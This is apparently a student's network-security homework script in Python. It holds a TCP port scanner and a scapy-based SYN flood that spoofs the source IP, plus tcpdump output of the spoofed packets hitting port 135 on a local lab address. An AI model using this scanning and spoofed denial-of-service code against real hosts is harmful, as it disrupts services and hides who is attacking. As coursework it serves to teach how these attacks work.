#!/usr/bin/env python

#Homework Number: hw08
#Name: Dimcho Karakashev
#ECN Login: dkarakas
#Due Date: 04/21/17


from scapy.all import *
import socket as socket
"""
The output of tcpdump:

The address I was attacking was: 192.168.1.7
My ip address was: 192.168.1.87 (tcpdump demonstrates the ipspoof)

The command used:
sudo tcpdump -vvv -nn -i wlan0 -s 1500 -S -X -c 4  dst 192.168.1.7

tcpdump: listening on wlan0, link-type EN10MB (Ethernet), capture size 1500 bytes
04:28:57.661033 IP (tos 0x0, ttl 64, id 1, offset 0, flags [none], proto TCP (6), length 40)
    192.168.1.100.17062 > 192.168.1.7.135: Flags [S], cksum 0xc8f9 (correct), seq 0, win 8192, length 0
	0x0000:  4500 0028 0001 0000 4006 f713 c0a8 0164  E..(....@......d
	0x0010:  c0a8 0107 42a6 0087 0000 0000 0000 0000  ....B...........
	0x0020:  5002 2000 c8f9 0000                      P.......
04:28:57.732803 IP (tos 0x0, ttl 64, id 1, offset 0, flags [none], proto TCP (6), length 40)
    192.168.1.100.8905 > 192.168.1.7.135: Flags [S], cksum 0xe8d6 (correct), seq 0, win 8192, length 0
	0x0000:  4500 0028 0001 0000 4006 f713 c0a8 0164  E..(....@......d
	0x0010:  c0a8 0107 22c9 0087 0000 0000 0000 0000  ...."...........
	0x0020:  5002 2000 e8d6 0000                      P.......
04:28:57.796809 IP (tos 0x0, ttl 64, id 1, offset 0, flags [none], proto TCP (6), length 40)
    192.168.1.100.33801 > 192.168.1.7.135: Flags [S], cksum 0x8796 (correct), seq 0, win 8192, length 0
	0x0000:  4500 0028 0001 0000 4006 f713 c0a8 0164  E..(....@......d
	0x0010:  c0a8 0107 8409 0087 0000 0000 0000 0000  ................
	0x0020:  5002 2000 8796 0000                      P.......
04:28:57.872910 IP (tos 0x0, ttl 64, id 1, offset 0, flags [none], proto TCP (6), length 40)
    192.168.1.100.62172 > 192.168.1.7.135: Flags [S], cksum 0x18c3 (correct), seq 0, win 8192, length 0
	0x0000:  4500 0028 0001 0000 4006 f713 c0a8 0164  E..(....@......d
	0x0010:  c0a8 0107 f2dc 0087 0000 0000 0000 0000  ................
	0x0020:  5002 2000 18c3 0000                      P.......
4 packets captured
4 packets received by filter
0 packets dropped by kernel
"""

class TcpAttack:

    def __init__(self,spoofIP,targetIP):
        self.spoofIP = spoofIP
        self.targetIP = targetIP

    def scanTarge(self,rangeStart,rangeEnd):
        port_to_write = ""#this will contain ready to write string

        for port in range(rangeStart,rangeEnd+1):
            try:
                #initilize the socket
                socket_connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # those are specified by default
                socket_connect.settimeout(0.1)  # as recommended by lecture notes seting the timeout
                socket_connect.connect((self.targetIP,port)) #trying to connect
                port_to_write = port_to_write + str(port) + "\n" #accumulating the ip_addresses in a string
                print("Port {} open".format(port))
            except:
                pass
                print("Port {} looks like it is closed".format(port))

        with open("openpowrts.txt", "w") as file:#writing accumulated ports in a file
            file.write(port_to_write)


    def attackTarget(self,port):
        try:
            socket_check_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#initilizing the socket for IPv4
            socket_check_connection.settimeout(0.1)#setting the timeout
            socket_check_connection.connect((self.targetIP,port))#trying to connect using the port
            for i in range(100):#sending 100 packages
                ipHeader = scapy.all.IP(src = self.spoofIP, dst = self.targetIP)#creating the Ip header
                tcpHeader = scapy.all.TCP(flags="S", sport=scapy.all.RandShort(), dport=port)#creating the TCP header
                scapy.all.send(ipHeader/tcpHeader)#sending the package
            return 1
        except Exception as e:
            print("Error has been detected")#prints error issues
            print("{}".format(e))
            return 0
        pass


if __name__ == "__main__":
    DOSattack = TcpAttack("192.168.1.100","192.168.1.7")
    DOSattack.scanTarge(1,500)
    DOSattack.attackTarget(135)